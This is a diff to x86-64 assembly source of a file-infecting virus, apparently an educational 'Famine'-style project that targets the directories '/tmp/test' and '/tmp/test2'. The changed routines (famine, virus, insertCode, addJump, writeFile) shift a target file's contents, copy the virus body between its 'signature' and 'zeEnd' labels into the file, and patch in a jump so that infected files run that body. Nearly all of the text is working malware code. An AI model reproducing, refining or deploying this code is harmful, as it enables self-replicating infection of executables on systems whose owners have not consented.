@@ -8,37 +8,41 @@ _start:
 	nop
 	nop
 	nop
-	push rsp
-    push rax
-    push rdi
-    push rsi
-    push rdx
-    push rcx
-	push rbx
+	push   rsp
+    push   rax
+    push   rdi
+    push   rsi
+    push   rdx
+    push   rcx
+	push   rbx
 	sub    rsp,0x18
-	lea    rdi,[rsp+0x3]
-	mov    DWORD [rsp+0x9],0x6d742f2e
-	mov    DWORD [rsp+0x3],0x6d742f2e
-	mov    WORD [rsp+0x7],0x70
-	mov    DWORD [rsp+0xc],0x32706d
+	lea    rdi,[rsp]
+	mov    QWORD [rsp],0x706D742F
+	mov    QWORD [rsp + 0x4],0x7365742F
+	mov    QWORD [rsp + 0x8],0x00000074
 	call   famine
-	lea    rdi,[rsp+0x9]
+	mov    DWORD [rsp+0x8],0x00003274
+	lea    rdi,[rsp]
 	call   famine
+	add    rsp,0x18
+	pop    rbx
+	pop    rcx
+    pop    rdx
+    pop    rsi
+    pop    rdi
+    pop    rax
+    pop    rsp
 	mov    r8d,0x3c
 	xor    ecx,ecx
 	xor    edx,edx
 	xor    esi,esi
 	xor    edi,edi
 	call   ft_syscall
-	add    rsp,0x18
-	pop rbx
-	pop rcx
-    pop rdx
-    pop rsi
-    pop rdi
-    pop rax
-    pop rsp
-	ret
+	nop
+	nop
+	nop
+	nop
+	nop
 
 virus:
 	push   r12
@@ -627,15 +631,16 @@ change_program_header:
 	pop    rbp
 	pop    r12
 	ret
+	
 
 
 addJump:
-	push   rbx
-	movsxd rbx,edi
-	add    rsi,0x90
-	mov    r8d,0x8
-	mov    rdi,rbx
+	push   rbp
+	movsxd rbp,edi
+	add    rsi,0x99
 	xor    ecx,ecx
+	mov    rdi,rbp
+	mov    r8d,0x8
 	sub    rsp,0x20
 	mov    QWORD [rsp+0x8],rdx
 	xor    edx,edx
@@ -643,73 +648,74 @@ addJump:
 	mov    BYTE [rsp+0x1f],0xe9
 	call   ft_syscall
 	lea    rsi,[rsp+0x1f]
-	mov    rdi,rbx
+	mov    rdi,rbp
 	xor    ecx,ecx
 	mov    r8d,0x1
 	mov    edx,0x1
 	call   ft_syscall
 	lea    rsi,[rsp+0x8]
-	mov    rdi,rbx
+	mov    rdi,rbp
 	xor    ecx,ecx
 	mov    r8d,0x1
 	mov    edx,0x4
 	call   ft_syscall
 	add    rsp,0x20
-	pop    rbx
+	pop    rbp
 	ret    
-
 insertCode:
+	push   r15
+	mov    r15,rdx
 	push   r14
-	mov    r14,rdx
 	push   r13
-	mov    r13,rsi
+	mov    r13d,edi
 	push   r12
-	mov    r12,zeEnd
-	push   r8
-	mov    r8, signature
-	sub    r12,r8
-	pop    r8
+	lea    r12,[rel zeEnd]
 	push   rbp
-	mov    ebp,edi
-	mov    r12d,r12d
+	movsxd rbp,ecx
+	mov    edx,ebp
+	imul   rbp,rbp,0x38
 	push   rbx
-	movsxd rbx,ecx
-	mov    edx,ebx
-	imul   rbx,rbx,0x38
+	mov    rbx,rsi
+	push   rax
+	lea    r14,[rel signature]
+	add    rbx,rbp
+	sub    r12,r14
+	movsxd rbp,r13d
 	call   CleanPayloadAreaAndShiftFileContent
+	mov    r12d,r12d
+	mov    rsi,QWORD [rbx+0x28]
+	mov    rdi,rbp
+	add    rsi,QWORD [rbx+0x8]
 	mov    r8d,0x8
 	xor    ecx,ecx
 	xor    edx,edx
-	add    rbx,r13
-	movsxd r13,ebp
-	mov    rsi,QWORD [rbx+0x28]
-	mov    rdi,r13
-	add    rsi,QWORD [rbx+0x8]
 	call   ft_syscall
-	mov    rdi,r13
 	mov    rdx,r12
+	mov    rsi,r14
+	mov    rdi,rbp
 	xor    ecx,ecx
-	mov    rsi,signature
 	mov    r8d,0x1
 	call   ft_syscall
-    mov    rdx,QWORD [r14+0x18]
-   	mov    rsi,QWORD [rbx+0x28]
-   	mov    edi,ebp
-   	sub    rdx,r12
-   	sub    rdx,QWORD [rbx+0x18]
-   	sub    rdx,rsi
-   	add    rsi,QWORD [rbx+0x8]
+	mov    rdx,QWORD [r15+0x18]
+	mov    rsi,QWORD [rbx+0x28]
+	mov    edi,r13d
+	sub    rdx,0x9a
+	sub    rdx,QWORD [rbx+0x18]
+	sub    rdx,rsi
+	add    rsi,QWORD [rbx+0x8]
+	pop    rcx
 	pop    rbx
 	pop    rbp
 	pop    r12
 	pop    r13
 	pop    r14
+	pop    r15
 	jmp    addJump
 
 
 writeFile:
 	push   rbp
-	mov    rsi,signature
+	lea    rsi,[rel signature]
 	mov    ecx,0xf
 	mov    rbp,rsp
 	push   r15
